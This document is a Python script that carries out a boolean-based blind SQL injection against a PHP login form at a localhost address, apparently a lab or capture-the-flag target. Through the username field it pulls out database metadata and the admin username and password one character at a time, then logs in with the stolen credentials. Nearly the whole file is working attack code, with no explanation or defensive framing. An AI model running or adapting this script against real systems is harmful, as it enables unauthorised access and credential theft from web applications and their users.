#!/usr/bin/env python3

import requests
import sys
import time

# Configuration
TARGET_URL = "http://127.0.0.1:33210/index.php"
PHPSESSID = "pr8716h5ra06p5lchf9osb22qr"

# Session setup with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)

def check_boolean_condition(payload):
    """Sends POST request with injected payload and checks boolean condition."""
    data = {
        "username": payload,
        "password": "test",
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        response_text = response.text
        
        # TRUE condition: contains "password"
        # FALSE condition: contains "username"
        if "\"response\":\"password\"" in response_text:
            return True
        elif "\"response\":\"username\"" in response_text:
            return False
        else:
            # Debug unexpected response
            if "error" in response_text.lower():
                print(f"[!] Error response: {response_text}")
            return False
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return False

def extract_length(column, table="users", where_condition="username='admin'"):
    """Extract the length of a column value using binary search."""
    print(f"[*] Extracting length of {column}...")
    
    low, high = 0, 50  # Reasonable max length for username/password
    
    for mid in range(low, high + 1):
        # Query: Check if length > mid
        payload = f"admin' AND (SELECT LENGTH({column}) FROM {table} WHERE {where_condition}) > {mid}#"
        is_true = check_boolean_condition(payload)
        
        if not is_true:
            length = mid
            print(f"[+] {column} length: {length}")
            return length
    
    print(f"[!] Could not determine length")
    return 0

def extract_character(column, position, table="users", where_condition="username='admin'"):
    """Extract a single character at position using binary search."""
    low, high = 32, 126  # Printable ASCII range
    attempts = 0
    
    while low <= high and attempts < 30:  # Limit attempts to prevent infinite loop
        attempts += 1
        mid = (low + high) // 2
        
        # Test if ASCII value > mid
        payload = f"admin' AND (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) > {mid}#"
        gt_result = check_boolean_condition(payload)
        
        if gt_result:
            low = mid + 1
        else:
            # Test if equals mid
            payload_eq = f"admin' AND (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) = {mid}#"
            eq_result = check_boolean_condition(payload_eq)
            
            if eq_result:
                return chr(mid)
            else:
                high = mid - 1
    
    # Check if low is the correct value
    payload_check = f"admin' AND (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) = {low}#"
    if check_boolean_condition(payload_check):
        return chr(low)
    
    return None

def extract_string(column, table="users", where_condition="username='admin'"):
    """Extract full string column value character by character."""
    print(f"\n[*] Extracting {column}...")
    
    length = extract_length(column, table, where_condition)
    if length == 0:
        print(f"[!] Could not extract length for {column}")
        return None
    
    result = ""
    for pos in range(1, length + 1):
        char = extract_character(column, pos, table, where_condition)
        if char is None:
            print(f"[!] Failed to extract character at position {pos}")
            break
        
        result += char
        print(f"[+] {column} ({pos}/{length}): {result}")
        time.sleep(0.1)  # Brief delay to avoid overwhelming server
    
    return result

def test_common_usernames():
    """Test common usernames to find admin account."""
    common_users = ['admin', 'administrator', 'root', 'sysadmin', 'system']
    
    print(f"\n[*] Testing common usernames...")
    
    for user in common_users:
        # Simple existence check
        payload = f"admin' AND (SELECT COUNT(*) FROM users WHERE username='{user}') > 0#"
        if check_boolean_condition(payload):
            print(f"[+] Found user: {user}")
            
            # Verify by extracting the username
            extracted = extract_string('username', 'users', f"username='{user}'")
            if extracted == user:
                print(f"[+] Confirmed: {user}")
                return user
        else:
            print(f"[-] User '{user}' not found")
    
    # Try generic extraction if no common usernames found
    print(f"\n[*] No common username found, trying to extract first user...")
    first_user = extract_string('username', 'users', 'id=1')
    if first_user:
        print(f"[+] Found first user: {first_user}")
        return first_user
    
    # Try without WHERE clause
    first_user = extract_string('username', 'users', '1=1 LIMIT 1')
    if first_user:
        print(f"[+] Found first user (without WHERE): {first_user}")
        return first_user
    
    return None

def attempt_login_with_credentials(username, password):
    """Attempt login with extracted credentials and check for session cookie."""
    print(f"\n{'='*60}")
    print("ATTEMPTING LOGIN WITH EXTRACTED CREDENTIALS")
    print("="*60)
    print(f"[*] Username: {username}")
    print(f"[*] Password: {password}")
    
    # Clear session for fresh login
    new_session = requests.Session()
    data = {
        "username": username,
        "password": password,
        "submit": "Login"
    }
    
    try:
        response = new_session.post(TARGET_URL, data=data, timeout=10)
        
        print(f"[+] Status code: {response.status_code}")
        print(f"[+] Response body: {response.text[:200]}")
        
        # Parse login result
        if "\"response\":\"password\"" in response.text:
            print("[!] Login failed - still asking for password")
            return False
        elif "logout" in response.text.lower():
            print("[+] Login successful!")
            return True
        elif "welcome" in response.text.lower():
            print("[+] Login successful!")
            return True
        else:
            print("[?] Unclear login result")
            return None
    except Exception as e:
        print(f"[!] Error during login: {e}")
        return False

def extract_database_info():
    """Extract database information to verify injection works."""
    print(f"\n{'='*60}")
    print("EXTRACTING DATABASE INFORMATION")
    print("="*60)
    
    # Extract database version
    version = extract_string('VERSION()', 'users', '1=1 LIMIT 1')
    print(f"[+] MySQL Version: {version}")
    
    # Extract database name if version extraction works
    if version:
        db_name = extract_string('DATABASE()', 'users', '1=1 LIMIT 1')
        print(f"[+] Database Name: {db_name}")
        
        # List databases if possible
        current_user = extract_string('CURRENT_USER()', 'users', '1=1 LIMIT 1')
        print(f"[+] Current User: {current_user}")
    
    return version is not None

def main():
    print("=" * 70)
    print("Boolean-Based Blind SQL Injection")
    print("Target: http://127.0.0.1:33210/index.php")
    print("Method: Binary search with JSON response analysis")
    print("=" * 70)
    
    # Step 1: Test if injection works by extracting basic info
    print("\n[*] Testing injection with VERSION()...")
    if not extract_database_info():
        print("[!] Warning: Could not extract basic database info, but will continue with user extraction...")
    
    # Step 2: Find admin username
    print("\n[*] Searching for admin username...")
    admin_username = test_common_usernames()
    
    if not admin_username:
        print("[!] Failed to find admin username")
        return False
    
    # Step 3: Extract complete username
    print(f"\n[*] Extracting complete username...")
    extracted_username = extract_string('username', 'users', f"username='{admin_username}'")
    
    # Step 4: Extract admin password
    print(f"\n[*] Extracting admin password...")
    extracted_password = extract_string('password', 'users', f"username='{admin_username}'")
    
    if not extracted_password:
        print("[!] Failed to extract admin password")
        return False
    
    # Step 5: Display results
    print("\n" + "=" * 70)
    print("EXTRACTED ADMIN CREDENTIALS")
    print("=" * 70)
    print(f"Username: {extracted_username}")
    print(f"Password: {extracted_password}")
    print("=" * 70)
    
    # Step 6: Attempt login with extracted credentials
    success = attempt_login_with_credentials(extracted_username, extracted_password)
    
    # Print session cookie
    print(f"\n[*] Session cookie from injection attempts: PHPSESSID={session.cookies['PHPSESSID']}")
    
    if success:
        print("\n[!] SUCCESS: Admin credentials extracted and verified!")
        return True
    else:
        print("\n[!] Credentials extracted successfully, verify login manually")
        return False

if __name__ == "__main__":
    main()

